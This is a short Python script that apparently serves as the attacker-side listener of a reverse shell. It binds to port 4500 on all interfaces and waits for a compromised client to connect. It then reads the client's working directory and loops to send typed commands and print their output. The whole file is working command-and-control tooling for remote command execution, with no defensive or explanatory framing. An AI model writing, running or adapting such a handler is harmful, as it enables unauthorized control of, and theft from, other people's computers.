import socket

from fast import ascii
print(ascii)

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4500
BUFFER_SIZE = 1024 * 128 

SEPARATOR = "<sep>"

sockt_ = socket.socket()

sockt_.bind((SERVER_HOST, SERVER_PORT))
sockt_.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sockt_.listen(5)

print(f"[!] LISTENING IN {SERVER_HOST}:{SERVER_PORT} [!]")

client_socket, client_address = sockt_.accept()
print(f"\n[!] {client_address[0]}:{client_address[1]} CONNNECTED\n")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[#] YOU ARE HERE:", cwd)

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue

    client_socket.send(command.encode())
    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER_SIZE).decode()

    results, cwd = output.split(SEPARATOR)

    print(results)

client_socket.close()

sockt_.close()